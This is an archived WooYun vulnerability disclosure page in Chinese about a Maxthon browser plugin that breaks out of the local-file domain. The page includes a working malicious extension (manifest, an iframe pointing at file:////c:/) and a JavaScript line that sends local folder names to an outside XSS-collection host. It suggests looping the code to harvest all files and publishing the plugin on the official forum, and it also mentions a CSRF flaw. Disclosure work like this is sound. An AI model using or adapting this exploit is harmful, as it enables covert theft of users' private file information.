@@ -1,0 +1,263 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		傲游浏览器本地域突破（浏览器插件风险）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		傲游浏览器本地域突破（浏览器插件风险）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/杀戮">杀戮</a> 
+</li><li>提交时间：		2013-04-22 01:13</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-25：	细节向第三方安全合作伙伴开放<br/>
+									2013-05-02：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-12：	细节向普通白帽子公开<br/>
+									2013-06-01：	细节向实习白帽子公开<br/>
+									2013-07-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">    就是要带感~~~~<br />
+<br />
+    我觉得。。。。好想吐。。。。。忙了快一天了，早上测试，中午午睡后进行利用程序的编写和调试，晚上整改完才发上来。。。<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">傲游浏览器为了扩展自身的功能允许用户开发与下载插件，而插件存在对域的访问存在安全问题。 基础去读</p><pre><code>http://www.80vul.com/webzine_0x05/走向本地的邪恶之路</code></pre><p class='detail'><br />
+<br />
+遨游浏览器使用了双内核 Webkit 和 Trident。<br />
+<br />
+我们来看下 Webkit对本地域的限制，为了安全，浏览器会禁止js对本地域的访问。如下图:<br />
+<br />
+</p><p class="detail"><a href="../images/211919125c01bedf7d94d941200151f2e9220c18.jpg" target="_blank"><img src="../images/211919125c01bedf7d94d941200151f2e9220c18.jpg" alt="360软件小助手截图20130421191903.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+限制了对文章的加载，但是我们通过插件再看看，点开一个插件，然后右键查看元素，然后会在插件中弹出调试器。Enter:<br />
+<br />
+</p><pre><code>location.href=&quot;file:////c:/&quot;;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/21192155fbdb6f93d6e5dc97465bd8a29ba8a7bb.jpg" target="_blank"><img src="../images/21192155fbdb6f93d6e5dc97465bd8a29ba8a7bb.jpg" alt="360软件小助手截图20130421192141.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+你个悲剧。。。。<br />
+<br />
+让我们来看下如何利用，先来看下Webkit和Trident对浏览器上查看本地文件的方式。<br />
+<br />
+打开IE，输入file:////c:/ 会弹出一个文件查看器<br />
+<br />
+</p><p class="detail"><a href="../images/21192751729146d3139790f7872656c06f1a3b05.jpg" target="_blank"><img src="../images/21192751729146d3139790f7872656c06f1a3b05.jpg" alt="360软件小助手截图20130421192615.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+然后打开chrome 输入file:////c:/<br />
+<br />
+</p><p class="detail"><a href="../images/21193005accead5dc3797f99cf3e9ea0fd59ca9e.jpg" target="_blank"><img src="../images/21193005accead5dc3797f99cf3e9ea0fd59ca9e.jpg" alt="360软件小助手截图20130421192953.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+看出差别了不，chrome是以网页的方式呈现本地文件的，也就是说，可以通过DOM对本地进行操作，联想下刚刚的，淫荡的笑一下，我们只要通过一个恶意插件就可以完成对本地信息的获取。<br />
+<br />
+现在看看我们需要怎样编写利用程序:<br />
+<br />
+1.客户端 在傲游上面可以运行的插件<br />
+<br />
+2.服务端 接受获取到的信息<br />
+<br />
+服务端比较容易，用XSS平台就可以解决，但是客户端，虽然里头是chrome但是插件的编写却完全不同，为了编写利用程序，我他日的中午一直在学习傲游插件的编写，妈的。<br />
+<br />
+XSS平台卡住了，先编写傲游的插件吧。需要几个文件<br />
+<br />
+</p><pre><code>主文件: def.json<br />
+执行文件:window.html<br />
+语言文件:locale/zh-cn.ini</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>//def.json<br />
+{<br />
+   &quot;type&quot;:&quot;extension&quot;,<br />
+   &#039;frameworkVersion&#039; : &#039;1.0.0&#039;,<br />
+   &#039;guid&#039; : &#039;{ID}&#039;,   //去　www.guidgenerator.com. 生成一个<br />
+   &#039;version&#039; : &#039;1.0.0&#039;,<br />
+   &#039;title&#039; : {<br />
+      &#039;_t&#039; : &#039;app.title&#039;<br />
+　　　 &#039;en&#039; : &#039;The World&#039;,<br />
+      &#039;zh-cn&#039; : &#039;世界&#039;<br />
+   },<br />
+   &#039;actions&#039;:[   <br />
+      {<br />
+          &quot;type&quot;:&quot;window&quot;,<br />
+          &#039;entryPoints&#039; : [ &#039;sidebar&#039;, &#039;toolbar&#039; ],<br />
+          &#039;main&#039;:&#039;window.html&#039;<br />
+      }<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>//window.html<br />
+&lt;iframe id=1 src=&quot;file:////c:/&quot;&gt;&lt;/iframe&gt; <br />
+&lt;script&gt;XSSER代码&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>//  locale/zh-cn.ini<br />
+[lang]<br />
+app.title=世界</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+好吧，丫的XSSER瘫了，我简单说下，自己创建一个模块，加一个location参数，然后代码如下<br />
+<br />
+</p><pre><code>(new Image()).src=&quot;http://xsser.me/index.php?do=api&amp;id={projectId}&amp;location=&quot;+document.getElementById(1).contentWindow.document.getElementsByClassName(&#039;icon-folder&#039;)[0].getAttribute(&#039;title&#039;);</code></pre><p class='detail'><br />
+<br />
+XSSER是没办法看了，看下本地执行的效果吧。<br />
+<br />
+</p><p class="detail"><a href="../images/2120385083015ddc1cef05784c455bb447b2ceb7.jpg" target="_blank"><img src="../images/2120385083015ddc1cef05784c455bb447b2ceb7.jpg" alt="360软件小助手截图20130421203831.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+懂了吧，自己加个循环就可以获取整个电脑的文件信息，毫无隐私啊~~~~<br />
+<br />
+然后用makpak生成插件  上传到官方论坛 然后。。。。。。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">上面上面<br />
+<br />
+再送一个CSRF吧<br />
+<br />
+傲游有一个默认安装插件哈哈.MX 点击喜欢 通过监控截获请求 没有加token  吧链接给给别人点击 可以造成CSRF </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">打个广告<br />
+<br />
+http://t.qq.com/SlaughterSain </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/杀戮" title="杀戮">杀戮</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022263" title="傲游浏览器本地域突破（浏览器插件风险）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-04-22 08:11</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已转交开发处理. 感谢报告.</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22263";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
